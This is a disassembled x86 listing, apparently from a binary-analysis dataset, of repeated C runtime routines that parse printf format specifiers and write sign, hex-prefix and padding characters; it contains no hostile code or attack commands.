call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
push 0x6c
pop edx
cmp eax edx
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
add eax 0x2
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
movzx eax [ edx ]
cmp eax 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp eax 0x36
jne r-xdata
cmp [ edx + 0x2 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp eax 0x64
je r-xdata
cmp [ edx + 0x2 ] 0x34
jne r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
push 0x68
pop edx
cmp eax edx
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp eax 0x69
je r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
add eax 0x2
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp eax 0x75
je r-xdata
cmp eax 0x78
je r-xdata
cmp eax 0x58
jne r-xdata
sub_420fac
movzx eax [ ecx + 0x32 ]
cmp eax 0x46
jne r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_422957
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
push 0x6c
pop edx
cmp eax edx
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
add eax 0x2
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
movzx eax [ edx ]
cmp eax 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp eax 0x36
jne r-xdata
cmp [ edx + 0x2 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp eax 0x64
je r-xdata
cmp [ edx + 0x2 ] 0x34
jne r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
push 0x68
pop edx
cmp eax edx
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp eax 0x69
je r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
add eax 0x2
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp eax 0x75
je r-xdata
cmp eax 0x78
je r-xdata
cmp eax 0x58
jne r-xdata
sub_421128
movzx eax [ ecx + 0x32 ]
cmp eax 0x46
jne r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ecx ]
and eax 0x8
or eax 0x0
jne r-xdata
cmp [ ecx + 0x2c ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x8
pop edx
and eax edx
or eax 0x0
jne r-xdata
mov al 0x1
retn
mov [ ecx + 0x1c ] 0x7
jmp sub_422bc3
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor al al
retn
cmp eax 0x6a
jg r-xdata
mov [ ecx + 0x1c ] edx
push 0x6c
pop edx
cmp eax edx
je r-xdata
je r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x74
je r-xdata
mov [ ecx + 0x2c ] 0x5
jmp r-xdata
cmp eax 0x49
je r-xdata
mov [ ecx + 0x2c ] 0x3
add eax 0x2
mov [ ecx + 0x2c ] 0x4
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0x7
jmp r-xdata
cmp eax 0x77
je r-xdata
mov edx [ ecx + 0x10 ]
movzx eax [ edx ]
cmp eax 0x33
jne r-xdata
cmp eax 0x4c
je r-xdata
mov [ ecx + 0x2c ] 0xc
jmp r-xdata
cmp eax 0x7a
jne r-xdata
cmp eax 0x36
jne r-xdata
cmp [ edx + 0x2 ] 0x32
jne r-xdata
mov [ ecx + 0x2c ] 0x8
jmp r-xdata
cmp eax 0x54
je r-xdata
mov [ ecx + 0x2c ] 0x6
jmp r-xdata
cmp eax 0x64
je r-xdata
cmp [ edx + 0x2 ] 0x34
jne r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xa
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov [ ecx + 0x2c ] 0xd
jmp r-xdata
push 0x68
pop edx
cmp eax edx
jne r-xdata
mov [ ecx + 0x2c ] 0x9
jmp r-xdata
cmp eax 0x69
je r-xdata
lea eax [ edx + 0x4 ]
mov [ ecx + 0x2c ] 0xb
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov eax [ ecx + 0x10 ]
cmp [ eax ] dx
jne r-xdata
cmp eax 0x6f
je r-xdata
mov [ ecx + 0x2c ] 0x2
jmp r-xdata
add eax 0x2
mov [ ecx + 0x2c ] 0x1
mov [ ecx + 0x10 ] eax
jmp r-xdata
cmp eax 0x75
je r-xdata
cmp eax 0x78
je r-xdata
cmp eax 0x58
jne r-xdata
sub_4212a4
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
xor ecx ecx
movsx eax [ esi + 0x31 ]
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax 0x58
jg r-xdata
mov ecx esi
call sub_426960
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_426840
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
xor al al
jmp r-xdata
push ecx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_4236b6
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_4231a2
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
cmp eax 0x41
je r-xdata
mov edx [ esi + 0x20 ]
xor eax eax
push edi
mov [ ebp - 0x4 ] ax
mov edi eax
mov [ ebp - 0x2 ] al
mov eax edx
shr eax 0x4
test bl al
je r-xdata
mov al bl
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_425080
jmp r-xdata
cmp eax 0x43
je r-xdata
mov cl [ esi + 0x31 ]
cmp cl 0x78
je r-xdata
mov eax edx
shr eax 0x6
test bl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_4260c8
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ecx
mov ecx esi
call sub_42485a
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test bl al
jne r-xdata
cmp cl 0x58
jne r-xdata
test bl dl
je r-xdata
mov [ ebp - 0x4 ] 0x2d
jmp r-xdata
mov ecx esi
call sub_4266cc
jmp r-xdata
cmp eax 0x47
jle r-xdata
cmp cl 0x61
je r-xdata
xor bl bl
mov eax edx
shr eax 0x1
test bl al
je r-xdata
mov [ ebp - 0x4 ] 0x2b
jmp r-xdata
mov edi ebx
cmp eax 0x53
jne r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x20
mov [ ebp + edi - 0x4 ] 0x30
cmp cl 0x58
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov ebx [ esi + 0x24 ]
sub ebx [ esi + 0x38 ]
sub ebx edi
test dl 0xc
jne r-xdata
test bl bl
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428b6f
mov ecx [ esi + 0x20 ]
lea edi [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c547
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_428443
cmp [ edi ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
mov [ ebp + edi - 0x3 ] al
add edi 0x2
mov al 0x1
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c547
add esp 0x10
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c547
add esp 0x10
sub_4214d3
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
xor ecx ecx
movsx eax [ esi + 0x31 ]
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax 0x58
jg r-xdata
mov ecx esi
call sub_4269d3
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_426858
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
mov ecx esi
call sub_41f48a
test al al
je r-xdata
xor al al
jmp r-xdata
push ecx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_423810
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_423205
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
cmp eax 0x41
je r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov al bl
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_4251ca
jmp r-xdata
cmp eax 0x43
je r-xdata
mov edx [ esi + 0x20 ]
xor eax eax
push edi
mov [ ebp - 0x4 ] ax
mov edi eax
mov [ ebp - 0x2 ] al
mov eax edx
shr eax 0x4
test bl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_42613c
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ecx
mov ecx esi
call sub_4248ea
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov cl [ esi + 0x31 ]
cmp cl 0x78
je r-xdata
mov eax edx
shr eax 0x6
test bl al
je r-xdata
mov ecx esi
call sub_4266eb
jmp r-xdata
cmp eax 0x47
jle r-xdata
mov eax edx
shr eax 0x5
test bl al
jne r-xdata
cmp cl 0x58
jne r-xdata
test bl dl
je r-xdata
mov [ ebp - 0x4 ] 0x2d
jmp r-xdata
cmp eax 0x53
jne r-xdata
cmp cl 0x61
je r-xdata
xor bl bl
mov eax edx
shr eax 0x1
test bl al
je r-xdata
mov [ ebp - 0x4 ] 0x2b
jmp r-xdata
mov edi ebx
mov al 0x1
cmp cl 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x20
mov [ ebp + edi - 0x4 ] 0x30
cmp cl 0x58
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov ebx [ esi + 0x24 ]
sub ebx [ esi + 0x38 ]
sub ebx edi
test dl 0xc
jne r-xdata
test bl bl
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428b6f
mov ecx [ esi + 0x20 ]
lea edi [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c547
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_4284ea
cmp [ edi ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
mov [ ebp + edi - 0x3 ] al
add edi 0x2
mov al 0x1
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c547
add esp 0x10
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c547
add esp 0x10
sub_42170d
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
xor ecx ecx
movsx eax [ esi + 0x31 ]
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax 0x58
jg r-xdata
mov ecx esi
call sub_426a4f
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_426870
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
xor al al
jmp r-xdata
push ecx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_423989
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_423284
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
cmp eax 0x41
je r-xdata
mov edx [ esi + 0x20 ]
xor eax eax
push edi
mov [ ebp - 0x4 ] ax
mov edi eax
mov [ ebp - 0x2 ] al
mov eax edx
shr eax 0x4
test bl al
je r-xdata
mov al bl
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_425348
jmp r-xdata
cmp eax 0x43
je r-xdata
mov cl [ esi + 0x31 ]
cmp cl 0x78
je r-xdata
mov eax edx
shr eax 0x6
test bl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_4261d5
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ecx
mov ecx esi
call sub_4249aa
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test bl al
jne r-xdata
cmp cl 0x58
jne r-xdata
test bl dl
je r-xdata
mov [ ebp - 0x4 ] 0x2d
jmp r-xdata
mov ecx esi
call sub_42670a
jmp r-xdata
cmp eax 0x47
jle r-xdata
cmp cl 0x61
je r-xdata
xor bl bl
mov eax edx
shr eax 0x1
test bl al
je r-xdata
mov [ ebp - 0x4 ] 0x2b
jmp r-xdata
mov edi ebx
cmp eax 0x53
jne r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x20
mov [ ebp + edi - 0x4 ] 0x30
cmp cl 0x58
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov ebx [ esi + 0x24 ]
sub ebx [ esi + 0x38 ]
sub ebx edi
test dl 0xc
jne r-xdata
test bl bl
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428b6f
mov ecx [ esi + 0x20 ]
lea edi [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c547
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_428591
cmp [ edi ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
mov [ ebp + edi - 0x3 ] al
add edi 0x2
mov al 0x1
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c547
add esp 0x10
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c547
add esp 0x10
sub_42193c
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
xor ecx ecx
movsx eax [ esi + 0x31 ]
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax 0x58
jg r-xdata
mov ecx esi
call sub_426ac2
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_426888
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
xor al al
jmp r-xdata
push ecx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_423ae3
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_4232e7
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
cmp eax 0x41
je r-xdata
mov edx [ esi + 0x20 ]
xor eax eax
push edi
mov [ ebp - 0x4 ] ax
mov edi eax
mov [ ebp - 0x2 ] al
mov eax edx
shr eax 0x4
test bl al
je r-xdata
mov al bl
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_425492
jmp r-xdata
cmp eax 0x43
je r-xdata
mov cl [ esi + 0x31 ]
cmp cl 0x78
je r-xdata
mov eax edx
shr eax 0x6
test bl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_426249
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ecx
mov ecx esi
call sub_424a3a
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test bl al
jne r-xdata
cmp cl 0x58
jne r-xdata
test bl dl
je r-xdata
mov [ ebp - 0x4 ] 0x2d
jmp r-xdata
mov ecx esi
call sub_426729
jmp r-xdata
cmp eax 0x47
jle r-xdata
cmp cl 0x61
je r-xdata
xor bl bl
mov eax edx
shr eax 0x1
test bl al
je r-xdata
mov [ ebp - 0x4 ] 0x2b
jmp r-xdata
mov edi ebx
cmp eax 0x53
jne r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x20
mov [ ebp + edi - 0x4 ] 0x30
cmp cl 0x58
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov ebx [ esi + 0x24 ]
sub ebx [ esi + 0x38 ]
sub ebx edi
test dl 0xc
jne r-xdata
test bl bl
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428c86
mov ecx [ esi + 0x20 ]
lea edi [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c5a4
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_428638
cmp [ edi ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
mov [ ebp + edi - 0x3 ] al
add edi 0x2
mov al 0x1
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c5a4
add esp 0x10
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c5a4
add esp 0x10
sub_421b6b
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
xor ecx ecx
movsx eax [ esi + 0x31 ]
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax 0x58
jg r-xdata
mov ecx esi
call sub_426b35
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_4268a0
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
mov ecx esi
call sub_41f4a1
test al al
je r-xdata
xor al al
jmp r-xdata
push ecx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_423c3d
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_42334a
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
cmp eax 0x41
je r-xdata
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov al bl
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_4255dc
jmp r-xdata
cmp eax 0x43
je r-xdata
mov edx [ esi + 0x20 ]
xor eax eax
push edi
mov [ ebp - 0x4 ] ax
mov edi eax
mov [ ebp - 0x2 ] al
mov eax edx
shr eax 0x4
test bl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_4262bd
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ecx
mov ecx esi
call sub_424aca
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov cl [ esi + 0x31 ]
cmp cl 0x78
je r-xdata
mov eax edx
shr eax 0x6
test bl al
je r-xdata
mov ecx esi
call sub_426748
jmp r-xdata
cmp eax 0x47
jle r-xdata
mov eax edx
shr eax 0x5
test bl al
jne r-xdata
cmp cl 0x58
jne r-xdata
test bl dl
je r-xdata
mov [ ebp - 0x4 ] 0x2d
jmp r-xdata
cmp eax 0x53
jne r-xdata
cmp cl 0x61
je r-xdata
xor bl bl
mov eax edx
shr eax 0x1
test bl al
je r-xdata
mov [ ebp - 0x4 ] 0x2b
jmp r-xdata
mov edi ebx
mov al 0x1
cmp cl 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x20
mov [ ebp + edi - 0x4 ] 0x30
cmp cl 0x58
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov ebx [ esi + 0x24 ]
sub ebx [ esi + 0x38 ]
sub ebx edi
test dl 0xc
jne r-xdata
test bl bl
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428c86
mov ecx [ esi + 0x20 ]
lea edi [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c5a4
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_4286df
cmp [ edi ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
mov [ ebp + edi - 0x3 ] al
add edi 0x2
mov al 0x1
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c5a4
add esp 0x10
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c5a4
add esp 0x10
sub_421da5
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
inc ebx
xor ecx ecx
movsx eax [ esi + 0x31 ]
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax 0x58
jg r-xdata
mov ecx esi
call sub_426bb1
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_4268b8
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
xor al al
jmp r-xdata
push ecx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_423db6
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_4233c9
jmp r-xdata
sub eax 0x7
je r-xdata
push ebx
cmp eax 0x41
je r-xdata
mov edx [ esi + 0x20 ]
xor eax eax
push edi
mov [ ebp - 0x4 ] ax
mov edi eax
mov [ ebp - 0x2 ] al
mov eax edx
shr eax 0x4
test bl al
je r-xdata
mov al bl
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ecx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_42575a
jmp r-xdata
cmp eax 0x43
je r-xdata
mov cl [ esi + 0x31 ]
cmp cl 0x78
je r-xdata
mov eax edx
shr eax 0x6
test bl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_426356
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ecx
mov ecx esi
call sub_424b8a
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test bl al
jne r-xdata
cmp cl 0x58
jne r-xdata
test bl dl
je r-xdata
mov [ ebp - 0x4 ] 0x2d
jmp r-xdata
mov ecx esi
call sub_426767
jmp r-xdata
cmp eax 0x47
jle r-xdata
cmp cl 0x61
je r-xdata
xor bl bl
mov eax edx
shr eax 0x1
test bl al
je r-xdata
mov [ ebp - 0x4 ] 0x2b
jmp r-xdata
mov edi ebx
cmp eax 0x53
jne r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov [ ebp - 0x4 ] 0x20
mov [ ebp + edi - 0x4 ] 0x30
cmp cl 0x58
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
cmp cl 0x41
je r-xdata
mov ebx [ esi + 0x24 ]
sub ebx [ esi + 0x38 ]
sub ebx edi
test dl 0xc
jne r-xdata
test bl bl
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ ebp - 0x4 ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428c86
mov ecx [ esi + 0x20 ]
lea edi [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c5a4
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_428786
cmp [ edi ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
mov [ ebp + edi - 0x3 ] al
add edi 0x2
mov al 0x1
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c5a4
add esp 0x10
push edi
push ebx
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c5a4
add esp 0x10
sub_421fd4
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
xor ebx ebx
push 0x41
pop edx
push 0x58
movzx eax [ esi + 0x32 ]
pop ecx
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax ecx
jg r-xdata
mov ecx esi
